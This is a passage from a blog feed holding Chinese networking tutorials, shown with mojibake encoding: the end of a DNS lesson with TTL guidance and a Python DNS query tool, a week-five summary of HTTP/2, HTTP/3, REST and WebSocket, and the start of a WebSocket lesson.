class="hljs markdown">TTL (Time To Live) - ç¼“å­˜æœ‰æ•ˆæœŸ<br><br>ç¤ºä¾‹ï¼š<br>www.example.com. 300 IN A 93.184.216.34<br><span class="hljs-code">                 â†‘</span><br><span class="hljs-code">                TTL=300ç§’ï¼ˆ5åˆ†é’Ÿï¼‰</span><br><span class="hljs-code"></span><br>TTLçš„ä½œç”¨ï¼š<br><span class="hljs-bullet">1.</span> æ§åˆ¶ç¼“å­˜æ—¶é—´<br><span class="hljs-bullet">2.</span> å¹³è¡¡æ€§èƒ½å’Œæ–°é²œåº¦<br><span class="hljs-bullet">3.</span> å‡è½»DNSæœåŠ¡å™¨è´Ÿæ‹…<br><br>TTLè®¾ç½®ç­–ç•¥ï¼š<br><br>çŸ­TTLï¼ˆ60-300ç§’ï¼‰ï¼š<br>âœ… å˜æ›´ç”Ÿæ•ˆå¿«<br>âœ… é€‚åˆé¢‘ç¹å˜æ›´çš„è®°å½•<br>âŒ æŸ¥è¯¢å¤šï¼ŒæœåŠ¡å™¨å‹åŠ›å¤§<br><br>é•¿TTLï¼ˆ3600-86400ç§’ï¼‰ï¼š<br>âœ… å‡å°‘æŸ¥è¯¢ï¼Œé™ä½å»¶è¿Ÿ<br>âœ… å‡è½»æœåŠ¡å™¨è´Ÿæ‹…<br>âŒ å˜æ›´ç”Ÿæ•ˆæ…¢<br><br>æ¨èè®¾ç½®ï¼š<br><span class="hljs-bullet">-</span> å¸¸ç”¨è®°å½•ï¼ˆwwwï¼‰: 300-3600ç§’<br><span class="hljs-bullet">-</span> ç¨³å®šè®°å½•ï¼ˆNSï¼‰: 3600-86400ç§’<br><span class="hljs-bullet">-</span> é‚®ä»¶è®°å½•ï¼ˆMXï¼‰: 3600ç§’<br><span class="hljs-bullet">-</span> å˜æ›´å‰ä¸´æ—¶é™ä½TTL<br></code></pre></td></tr></table></figure><hr><h2 id="6-å®æˆ˜é¡¹ç›®ï¼šDNSæŸ¥è¯¢å·¥å…·"><a href="#6-å®æˆ˜é¡¹ç›®ï¼šDNSæŸ¥è¯¢å·¥å…·" class="headerlink" title="6. å®æˆ˜é¡¹ç›®ï¼šDNSæŸ¥è¯¢å·¥å…·"></a>6. å®æˆ˜é¡¹ç›®ï¼šDNSæŸ¥è¯¢å·¥å…·</h2><h3 id="6-1-ä»£ç å®ç°"><a href="#6-1-ä»£ç å®ç°" class="headerlink" title="6.1 ä»£ç å®ç°"></a>6.1 ä»£ç å®ç°</h3><pre><code class="language-python"># day35_dns_query_tool.py# åŠŸèƒ½ï¼šDNSæŸ¥è¯¢å·¥å…·import socketimport structfrom typing import List, Tuple, Dictimport timeclass DNSQuery:    &quot;&quot;&quot;    DNSæŸ¥è¯¢å·¥å…·    åŠŸèƒ½ï¼š        1. æ„é€ DNSæŸ¥è¯¢æŠ¥æ–‡        2. å‘é€æŸ¥è¯¢        3. è§£æå“åº”        4. æ”¯æŒå¤šç§è®°å½•ç±»å‹    &quot;&quot;&quot;    # DNSè®°å½•ç±»å‹    QTYPE = {        &#39;A&#39;: 1,      # IPv4åœ°å€        &#39;NS&#39;: 2,     # åŸŸåæœåŠ¡å™¨        &#39;CNAME&#39;: 5,  # è§„èŒƒåç§°        &#39;SOA&#39;: 6,    # æˆæƒå¼€å§‹        &#39;PTR&#39;: 12,   # æŒ‡é’ˆè®°å½•        &#39;MX&#39;: 15,    # é‚®ä»¶äº¤æ¢        &#39;TXT&#39;: 16,   # æ–‡æœ¬        &#39;AAAA&#39;: 28,  # IPv6åœ°å€        &#39;ANY&#39;: 255   # æ‰€æœ‰è®°å½•    }    def __init__(self, dns_server=&#39;8.8.8.8&#39;, port=53):        &quot;&quot;&quot;        åˆå§‹åŒ–DNSæŸ¥è¯¢å™¨        å‚æ•°ï¼š            dns_server: DNSæœåŠ¡å™¨åœ°å€            port: DNSç«¯å£ï¼ˆé»˜è®¤53ï¼‰        &quot;&quot;&quot;        self.dns_server = dns_server        self.port = port    def build_query(self, domain: str, qtype: str = &#39;A&#39;) -&gt; bytes:        &quot;&quot;&quot;        æ„é€ DNSæŸ¥è¯¢æŠ¥æ–‡        å‚æ•°ï¼š            domain: è¦æŸ¥è¯¢çš„åŸŸå            qtype: æŸ¥è¯¢ç±»å‹ï¼ˆA, AAAA, MXç­‰ï¼‰        è¿”å›ï¼š            DNSæŸ¥è¯¢æŠ¥æ–‡ï¼ˆå­—èŠ‚ï¼‰        DNSæŠ¥æ–‡æ ¼å¼ï¼š        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                    Header                     |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                   Question                    |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                    Answer                     |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                  Authority                    |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                  Additional                   |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        &quot;&quot;&quot;        # 1. æ„é€ Headerï¼ˆ12å­—èŠ‚ï¼‰        transaction_id = 0x1234  # äº‹åŠ¡ID        flags = 0x0100  # æ ‡å‡†æŸ¥è¯¢ï¼ŒæœŸæœ›é€’å½’        questions = 1   # é—®é¢˜æ•°        answers = 0     # å›ç­”æ•°        authority = 0   # æƒå¨è®°å½•æ•°        additional = 0  # é™„åŠ è®°å½•æ•°        header = struct.pack(            &#39;!HHHHHH&#39;,            transaction_id, flags,            questions, answers, authority, additional        )        # 2. æ„é€ Question        # åŸŸåç¼–ç ï¼šå°† www.example.com ç¼–ç ä¸º \x03www\x07example\x03com\x00        qname = b&#39;&#39;        for part in domain.split(&#39;.&#39;):            qname += bytes([len(part)]) + part.encode()        qname += b&#39;\x00&#39;  # ç»“æŸæ ‡è®°        qtype_value = self.QTYPE.get(qtype.upper(), 1)        qclass = 1  # IN (Internet)        question = qname + struct.pack(&#39;!HH&#39;, qtype_value, qclass)        return header + question    def parse_response(self, response: bytes) -&gt; Dict:        &quot;&quot;&quot;        è§£æDNSå“åº”        å‚æ•°ï¼š            response: DNSå“åº”æŠ¥æ–‡        è¿”å›ï¼š            è§£æåçš„ç»“æœå­—å…¸        &quot;&quot;&quot;        result = {            &#39;header&#39;: {},            &#39;questions&#39;: [],            &#39;answers&#39;: [],            &#39;authority&#39;: [],            &#39;additional&#39;: []        }        # è§£æHeader        header = struct.unpack(&#39;!HHHHHH&#39;, response[:12])        result[&#39;header&#39;] = {            &#39;id&#39;: header[0],            &#39;flags&#39;: header[1],            &#39;questions&#39;: header[2],            &#39;answers&#39;: header[3],            &#39;authority&#39;: header[4],            &#39;additional&#39;: header[5]        }        # è§£æAnsweréƒ¨åˆ†ï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰        offset = 12        # è·³è¿‡Questionéƒ¨åˆ†        while response[offset] != 0:            offset += 1        offset += 5  # è·³è¿‡ç»“æŸç¬¦å’ŒQTYPEã€QCLASS        # è§£æAnswer        for _ in range(result[&#39;header&#39;][&#39;answers&#39;]):            # ç®€åŒ–ï¼šç›´æ¥æå–IPåœ°å€ï¼ˆå‡è®¾æ˜¯Aè®°å½•ï¼‰            if offset + 12 &lt;= len(response):                # è·³è¿‡åç§°ï¼ˆæŒ‡é’ˆï¼‰                offset += 2                # è¯»å–ç±»å‹ã€ç±»ã€TTLã€æ•°æ®é•¿åº¦                rtype, rclass, ttl, rdlength = struct.unpack(                    &#39;!HHIH&#39;,                    response[offset:offset+10]                )                offset += 10                # è¯»å–æ•°æ®                rdata = response[offset:offset+rdlength]                offset += rdlength                if rtype == 1 and rdlength == 4:  # Aè®°å½•                    ip = &#39;.&#39;.join(str(b) for b in rdata)                    result[&#39;answers&#39;].append({                        &#39;type&#39;: &#39;A&#39;,                        &#39;ttl&#39;: ttl,                        &#39;data&#39;: ip                    })        return result    def query(self, domain: str, qtype: str = &#39;A&#39;, verbose: bool = True) -&gt; Dict:        &quot;&quot;&quot;        æ‰§è¡ŒDNSæŸ¥è¯¢        å‚æ•°ï¼š            domain: åŸŸå            qtype: æŸ¥è¯¢ç±»å‹            verbose: æ˜¯å¦æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯        è¿”å›ï¼š            æŸ¥è¯¢ç»“æœ        &quot;&quot;&quot;        if verbose:            print(f&quot;\næ­£åœ¨æŸ¥è¯¢: {domain} ({qtype}è®°å½•)&quot;)            print(f&quot;DNSæœåŠ¡å™¨: {self.dns_server}:{self.port}&quot;)        # æ„é€ æŸ¥è¯¢        query_data = self.build_query(domain, qtype)        # åˆ›å»ºUDP socket        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)        sock.settimeout(3)        try:            # å‘é€æŸ¥è¯¢            start_time = time.time()            sock.sendto(query_data, (self.dns_server, self.port))            # æ¥æ”¶å“åº”            response, _ = sock.recvfrom(512)            query_time = (time.time() - start_time) * 1000            # è§£æå“åº”            result = self.parse_response(response)            result[&#39;query_time&#39;] = query_time            if verbose:                print(f&quot;æŸ¥è¯¢æ—¶é—´: {query_time:.2f}ms&quot;)                print(f&quot;å›ç­”æ•°é‡: {result[&#39;header&#39;][&#39;answers&#39;]}&quot;)                if result[&#39;answers&#39;]:                    print(&quot;\nç»“æœ:&quot;)                    for answer in result[&#39;answers&#39;]:                        print(f&quot;  ç±»å‹: {answer[&#39;type&#39;]}&quot;)                        print(f&quot;  TTL: {answer[&#39;ttl&#39;]}ç§’&quot;)                        print(f&quot;  æ•°æ®: {answer[&#39;data&#39;]}&quot;)            return result        except socket.timeout:            if verbose:                print(&quot;âŒ æŸ¥è¯¢è¶…æ—¶&quot;)            return {&#39;error&#39;: &#39;timeout&#39;}        except Exception as e:            if verbose:                print(f&quot;âŒ æŸ¥è¯¢å¤±è´¥: {e}&quot;)            return {&#39;error&#39;: str(e)}        finally:            sock.close()    def query_with_system(self, domain: str, verbose: bool = True):        &quot;&quot;&quot;        ä½¿ç”¨ç³»ç»ŸDNSæŸ¥è¯¢ï¼ˆå¯¹æ¯”ï¼‰        å‚æ•°ï¼š            domain: åŸŸå            verbose: æ˜¯å¦æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯        &quot;&quot;&quot;        if verbose:            print(f&quot;\nä½¿ç”¨ç³»ç»ŸDNSæŸ¥è¯¢: {domain}&quot;)        try:            start_time = time.time()            result = socket.getaddrinfo(domain, None)            query_time = (time.time() - start_time) * 1000            if verbose:                print(f&quot;æŸ¥è¯¢æ—¶é—´: {query_time:.2f}ms&quot;)                print(&quot;\nç»“æœ:&quot;)                for item in result:                    if item[0] == socket.AF_INET:  # IPv4                        print(f&quot;  IPv4: {item[4][0]}&quot;)                    elif item[0] == socket.AF_INET6:  # IPv6                        print(f&quot;  IPv6: {item[4][0]}&quot;)            return {&#39;results&#39;: result, &#39;query_time&#39;: query_time}        except Exception as e:            if verbose:                print(f&quot;âŒ æŸ¥è¯¢å¤±è´¥: {e}&quot;)            return {&#39;error&#39;: str(e)}def compare_dns_servers():    &quot;&quot;&quot;å¯¹æ¯”ä¸åŒDNSæœåŠ¡å™¨çš„æ€§èƒ½&quot;&quot;&quot;    print(&quot;\n&quot; + &quot;=&quot;*60)    print(&quot; DNSæœåŠ¡å™¨æ€§èƒ½å¯¹æ¯”&quot;)    print(&quot;=&quot;*60)    dns_servers = [        (&#39;Google DNS&#39;, &#39;8.8.8.8&#39;),        (&#39;Cloudflare DNS&#39;, &#39;1.1.1.1&#39;),        (&#39;114 DNS&#39;, &#39;114.114.114.114&#39;),    ]    test_domains = [        &#39;www.baidu.com&#39;,        &#39;www.google.com&#39;,        &#39;www.github.com&#39;    ]    print(f&quot;\næµ‹è¯•åŸŸå: {&#39;, &#39;.join(test_domains)}\n&quot;)    for name, server in dns_servers:        print(f&quot;\n{name} ({server}):&quot;)        print(&quot;-&quot; * 60)        query_tool = DNSQuery(server)        total_time = 0        success_count = 0        for domain in test_domains:            result = query_tool.query(domain, verbose=False)            if &#39;query_time&#39; in result:                total_time += result[&#39;query_time&#39;]                success_count += 1                print(f&quot;  {domain}: {result[&#39;query_time&#39;]:.2f}ms&quot;)        if success_count &gt; 0:            avg_time = total_time / success_count            print(f&quot;\n  å¹³å‡æŸ¥è¯¢æ—¶é—´: {avg_time:.2f}ms&quot;)def main():    &quot;&quot;&quot;ä¸»ç¨‹åº&quot;&quot;&quot;    print(&quot;&quot;&quot;    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—    â•‘       DNSæŸ¥è¯¢å·¥å…· v1.0                                    â•‘    â•‘       DNS Query Tool                                     â•‘    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•    &quot;&quot;&quot;)    # åˆ›å»ºDNSæŸ¥è¯¢å™¨    dns_query = DNSQuery(dns_server=&#39;8.8.8.8&#39;)    # æ¼”ç¤º1ï¼šåŸºæœ¬æŸ¥è¯¢    print(&quot;\nã€æ¼”ç¤º1ï¼šåŸºæœ¬DNSæŸ¥è¯¢ã€‘&quot;)    dns_query.query(&#39;www.baidu.com&#39;, &#39;A&#39;)    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    # æ¼”ç¤º2ï¼šç³»ç»ŸæŸ¥è¯¢å¯¹æ¯”    print(&quot;\nã€æ¼”ç¤º2ï¼šè‡ªå®šä¹‰vsç³»ç»ŸDNSæŸ¥è¯¢å¯¹æ¯”ã€‘&quot;)    dns_query.query_with_system(&#39;www.baidu.com&#39;)    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    # æ¼”ç¤º3ï¼šDNSæœåŠ¡å™¨æ€§èƒ½å¯¹æ¯”    print(&quot;\nã€æ¼”ç¤º3ï¼šä¸åŒDNSæœåŠ¡å™¨æ€§èƒ½å¯¹æ¯”ã€‘&quot;)    compare_dns_servers()    print(&quot;&quot;&quot;\næ€»ç»“ï¼šDNSæŸ¥è¯¢è¿‡ç¨‹åŒ…æ‹¬ï¼š1. æ„é€ æŸ¥è¯¢æŠ¥æ–‡2. å‘é€UDPæŸ¥è¯¢ï¼ˆç«¯å£53ï¼‰3. æ¥æ”¶å“åº”4. è§£æç»“æœä¼˜åŒ–å»ºè®®ï¼š- ä½¿ç”¨å¿«é€ŸDNSæœåŠ¡å™¨- åˆç†è®¾ç½®TTL- å¯ç”¨DNSç¼“å­˜- è€ƒè™‘ä½¿ç”¨DNS over HTTPS (DoH)æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ DNSå®‰å…¨ï¼ˆDNSSECï¼‰ï¼    &quot;&quot;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>äº”å‘¨å®æˆ˜æ€»ç»“</title>
    <link href="/2025/11/10/%E4%BA%94%E5%91%A8%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    <url>/2025/11/10/%E4%BA%94%E5%91%A8%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Day-32-34-ç¬¬äº”å‘¨å®æˆ˜æ€»ç»“"><a href="#Day-32-34-ç¬¬äº”å‘¨å®æˆ˜æ€»ç»“" class="headerlink" title="Day 32-34: ç¬¬äº”å‘¨å®æˆ˜æ€»ç»“"></a>Day 32-34: ç¬¬äº”å‘¨å®æˆ˜æ€»ç»“</h1><h2 id="Day-32-å®æˆ˜-æ„å»ºWeb-APIæœåŠ¡"><a href="#Day-32-å®æˆ˜-æ„å»ºWeb-APIæœåŠ¡" class="headerlink" title="Day 32: å®æˆ˜ - æ„å»ºWeb APIæœåŠ¡"></a>Day 32: å®æˆ˜ - æ„å»ºWeb APIæœåŠ¡</h2><p><strong>å­¦ä¹ å†…å®¹</strong>ï¼š<br>æ•´åˆå‰é¢å­¦ä¹ çš„RESTful APIçŸ¥è¯†ï¼Œæ„å»ºä¸€ä¸ªå®Œæ•´çš„Web APIæœåŠ¡ã€‚</p><p><strong>é¡¹ç›®ç‰¹æ€§</strong>ï¼š</p><ul><li>JWTè®¤è¯ç³»ç»Ÿ</li><li>è¯·æ±‚é™æµï¼ˆRate Limitingï¼‰</li><li>æ—¥å¿—è®°å½•</li><li>é”™è¯¯å¤„ç†</li><li>APIæ–‡æ¡£ï¼ˆSwaggerï¼‰</li><li>å•å…ƒæµ‹è¯•</li></ul><p><strong>é¡¹ç›®ç»“æ„</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api_server/<br>â”œâ”€â”€ app/<br>â”‚   â”œâ”€â”€ __init__<span class="hljs-selector-class">.py</span><br>â”‚   â”œâ”€â”€ models<span class="hljs-selector-class">.py</span><br>â”‚   â”œâ”€â”€ routes/<br>â”‚   â”œâ”€â”€ auth<span class="hljs-selector-class">.py</span><br>â”‚   â”œâ”€â”€ middleware<span class="hljs-selector-class">.py</span><br>â”‚   â””â”€â”€ utils<span class="hljs-selector-class">.py</span><br>â”œâ”€â”€ tests/<br>â”œâ”€â”€ requirements<span class="hljs-selector-class">.txt</span><br>â””â”€â”€ run.py<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒåŠŸèƒ½ä»£ç </strong>å·²æ”¾ç½®åœ¨ <code>code/day32/</code> ç›®å½•</p><hr><h2 id="Day-33-å®æˆ˜-WebSocketèŠå¤©å®¤"><a href="#Day-33-å®æˆ˜-WebSocketèŠå¤©å®¤" class="headerlink" title="Day 33: å®æˆ˜ - WebSocketèŠå¤©å®¤"></a>Day 33: å®æˆ˜ - WebSocketèŠå¤©å®¤</h2><p><strong>å­¦ä¹ å†…å®¹</strong>ï¼š<br>å®ç°ä¸€ä¸ªåŠŸèƒ½å®Œæ•´çš„WebSocketå®æ—¶èŠå¤©å®¤ã€‚</p><p><strong>åŠŸèƒ½æ¸…å•</strong>ï¼š</p><ul><li>âœ… ç”¨æˆ·ç™»å½•&#x2F;æ³¨å†Œ</li><li>âœ… å®æ—¶æ¶ˆæ¯å‘é€</li><li>âœ… æ¶ˆæ¯å†å²è®°å½•</li><li>âœ… åœ¨çº¿ç”¨æˆ·åˆ—è¡¨</li><li>âœ… ç§èŠåŠŸèƒ½</li><li>âœ… æˆ¿é—´ç®¡ç†</li><li>âœ… æ–­çº¿é‡è¿</li><li>âœ… Webå‰ç«¯ç•Œé¢</li></ul><p><strong>æ ¸å¿ƒåŠŸèƒ½ä»£ç </strong>å·²æ”¾ç½®åœ¨ <code>code/day33/</code> ç›®å½•</p><hr><h2 id="Day-34-ç¬¬äº”å‘¨æ€»ç»“"><a href="#Day-34-ç¬¬äº”å‘¨æ€»ç»“" class="headerlink" title="Day 34: ç¬¬äº”å‘¨æ€»ç»“"></a>Day 34: ç¬¬äº”å‘¨æ€»ç»“</h2><h3 id="æœ¬å‘¨å­¦ä¹ å›é¡¾"><a href="#æœ¬å‘¨å­¦ä¹ å›é¡¾" class="headerlink" title="æœ¬å‘¨å­¦ä¹ å›é¡¾"></a>æœ¬å‘¨å­¦ä¹ å›é¡¾</h3><p><strong>æ ¸å¿ƒçŸ¥è¯†ç‚¹</strong>ï¼š</p><ol><li>HTTP&#x2F;2 - æ€§èƒ½ä¼˜åŒ–åè®®</li><li>HTTP&#x2F;3 &amp; QUIC - ä¸‹ä¸€ä»£äº’è”ç½‘åè®®</li><li>RESTful API - Web APIè®¾è®¡è§„èŒƒ</li><li>WebSocket - å®æ—¶åŒå‘é€šä¿¡</li></ol><h3 id="æŠ€æœ¯æ ˆæŒæ¡"><a href="#æŠ€æœ¯æ ˆæŒæ¡" class="headerlink" title="æŠ€æœ¯æ ˆæŒæ¡"></a>æŠ€æœ¯æ ˆæŒæ¡</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTP/2ç‰¹æ€§ï¼š<br><span class="hljs-bullet">- </span>äºŒè¿›åˆ¶åˆ†å¸§<br><span class="hljs-bullet">- </span>å¤šè·¯å¤ç”¨<br><span class="hljs-bullet">- </span>å¤´éƒ¨å‹ç¼©ï¼ˆHPACKï¼‰<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨æ¨é€<br><br>HTTP/3ç‰¹æ€§ï¼š<br><span class="hljs-bullet">- </span>åŸºäºQUICï¼ˆUDPï¼‰<br><span class="hljs-bullet">- </span>0-RTTè¿æ¥<br><span class="hljs-bullet">- </span>æ— é˜Ÿå¤´é˜»å¡<br><span class="hljs-bullet">- </span>è¿æ¥è¿ç§»<br><br>RESTfulåŸåˆ™ï¼š<br><span class="hljs-bullet">- </span>èµ„æºå¯¼å‘<br><span class="hljs-bullet">- </span>ç»Ÿä¸€æ¥å£<br><span class="hljs-bullet">- </span>æ— çŠ¶æ€<br><span class="hljs-bullet">- </span>å¯ç¼“å­˜<br><br>WebSocketï¼š<br><span class="hljs-bullet">- </span>å…¨åŒå·¥é€šä¿¡<br><span class="hljs-bullet">- </span>ä½å»¶è¿Ÿ<br><span class="hljs-bullet">- </span>å®æ—¶æ¨é€<br></code></pre></td></tr></table></figure><h3 id="å®æˆ˜é¡¹ç›®æ€»ç»“"><a href="#å®æˆ˜é¡¹ç›®æ€»ç»“" class="headerlink" title="å®æˆ˜é¡¹ç›®æ€»ç»“"></a>å®æˆ˜é¡¹ç›®æ€»ç»“</h3><ol><li>âœ… HTTP&#x2F;2åˆ†æå™¨</li><li>âœ… QUICæ¼”ç¤ºç¨‹åº</li><li>âœ… ç”¨æˆ·ç®¡ç†API</li><li>âœ… WebSocketèŠå¤©å®¤</li></ol><h3 id="æ€§èƒ½å¯¹æ¯”æ•°æ®"><a href="#æ€§èƒ½å¯¹æ¯”æ•°æ®" class="headerlink" title="æ€§èƒ½å¯¹æ¯”æ•°æ®"></a>æ€§èƒ½å¯¹æ¯”æ•°æ®</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile">åè®®æ€§èƒ½ï¼ˆRTT=50msï¼‰ï¼š<br><span class="hljs-section">HTTP/1.1: 200ms</span><br><span class="hljs-section">HTTP/2:   150ms</span><br><span class="hljs-section">HTTP/3:   50ms   â† å¿«4å€</span><br><br>å®æ—¶é€šä¿¡ï¼š<br><span class="hljs-section">HTTPè½®è¯¢:  å»¶è¿Ÿ1000ms+</span><br><span class="hljs-section">WebSocket: å»¶è¿Ÿ&lt;10ms   â† å¿«100å€+</span><br></code></pre></td></tr></table></figure><h3 id="ä¸‹å‘¨é¢„å‘Š"><a href="#ä¸‹å‘¨é¢„å‘Š" class="headerlink" title="ä¸‹å‘¨é¢„å‘Š"></a>ä¸‹å‘¨é¢„å‘Š</h3><p><strong>ç¬¬å…­å‘¨ï¼šDNSå’Œå…¶ä»–åº”ç”¨å±‚åè®®ï¼ˆDay 35-40ï¼‰</strong></p><ul><li>Day 35: DNSæ·±å…¥</li><li>Day 36: DNSå®‰å…¨</li><li>Day 37: DNSæœåŠ¡å™¨å®ç°</li><li>Day 38: FTP&#x2F;SFTP</li><li>Day 39: é‚®ä»¶åè®®</li><li>Day 40: åº”ç”¨å±‚æ€»ç»“</li></ul><hr><h2 id="å­¦ä¹ å»ºè®®"><a href="#å­¦ä¹ å»ºè®®" class="headerlink" title="å­¦ä¹ å»ºè®®"></a>å­¦ä¹ å»ºè®®</h2><h3 id="å¿…é¡»æŒæ¡"><a href="#å¿…é¡»æŒæ¡" class="headerlink" title="å¿…é¡»æŒæ¡"></a>å¿…é¡»æŒæ¡</h3><ol><li>HTTP&#x2F;2çš„å¤šè·¯å¤ç”¨åŸç†</li><li>RESTful APIè®¾è®¡è§„èŒƒ</li><li>WebSocketæ¡æ‰‹å’Œé€šä¿¡æœºåˆ¶</li></ol><h3 id="å®è·µä»»åŠ¡"><a href="#å®è·µä»»åŠ¡" class="headerlink" title="å®è·µä»»åŠ¡"></a>å®è·µä»»åŠ¡</h3><ol><li>å®Œæˆæ‰€æœ‰ä»£ç ç¤ºä¾‹</li><li>ä½¿ç”¨WiresharkæŠ“åŒ…åˆ†æ</li><li>è®¾è®¡ä¸€ä¸ªå®Œæ•´çš„API</li><li>å®ç°ä¸€ä¸ªå®æ—¶åº”ç”¨</li></ol><h3 id="å¤ä¹ é‡ç‚¹"><a href="#å¤ä¹ é‡ç‚¹" class="headerlink" title="å¤ä¹ é‡ç‚¹"></a>å¤ä¹ é‡ç‚¹</h3><ul><li><input disabled="" type="checkbox"> HTTPç‰ˆæœ¬å¯¹æ¯”</li><li><input disabled="" type="checkbox"> RESTå…­å¤§çº¦æŸ</li><li><input disabled="" type="checkbox"> WebSocket vs HTTP</li><li><input disabled="" type="checkbox"> APIè®¾è®¡æœ€ä½³å®è·µ</li></ul><hr><p><strong>è¿›åº¦ï¼š34&#x2F;120å¤©ï¼ˆ28.3%ï¼‰</strong></p><p>ç¬¬äº”å‘¨å®Œæˆï¼ä½ å·²ç»æŒæ¡äº†ç°ä»£Webåº”ç”¨çš„æ ¸å¿ƒé€šä¿¡æŠ€æœ¯ã€‚</p><p>ç»§ç»­å‰è¿›ï¼Œç¬¬å…­å‘¨è§ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>31å¤©ï¼šWebSocketå®æ—¶é€šä¿¡</title>
    <link href="/2025/11/10/31%E5%A4%A9%EF%BC%9AWebSocket%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1/"/>
    <url>/2025/11/10/31%E5%A4%A9%EF%BC%9AWebSocket%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬31å¤©ï¼šWebSocketå®æ—¶é€šä¿¡"><a href="#ç¬¬31å¤©ï¼šWebSocketå®æ—¶é€šä¿¡" class="headerlink" title="ç¬¬31å¤©ï¼šWebSocketå®æ—¶é€šä¿¡"></a>ç¬¬31å¤©ï¼šWebSocketå®æ—¶é€šä¿¡</h1><blockquote><p>â€œWebSocketè®©Webåº”ç”¨æ‹¥æœ‰äº†çœŸæ­£çš„å®æ—¶åŒå‘é€šä¿¡èƒ½åŠ›ï¼â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡"><a href="#ğŸ“š-ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ğŸ“š ä»Šæ—¥ç›®æ ‡"></a>ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£WebSocketåè®®åŸç†</li><li>æŒæ¡WebSocketæ¡æ‰‹è¿‡ç¨‹</li><li>å­¦ä¹ WebSocketå¸§æ ¼å¼</li><li>å®ç°WebSocketå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨</li><li>ç†è§£WebSocket vs HTTPè½®è¯¢</li></ul><hr><h2 id="1-ä¸ºä»€ä¹ˆéœ€è¦WebSocketï¼Ÿ"><a href="#1-ä¸ºä»€ä¹ˆéœ€è¦WebSocketï¼Ÿ" class="headerlink" title="1. ä¸ºä»€ä¹ˆéœ€è¦WebSocketï¼Ÿ"></a>1. ä¸ºä»€ä¹ˆéœ€è¦WebSocketï¼Ÿ</h2><h3 id="1-1-HTTPçš„å±€é™æ€§"><a href="#1-1-HTTPçš„å±€é™æ€§" class="headerlink" title="1.1 HTTPçš„å±€é™æ€§"></a>1.1 HTTPçš„å±€é™æ€§</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 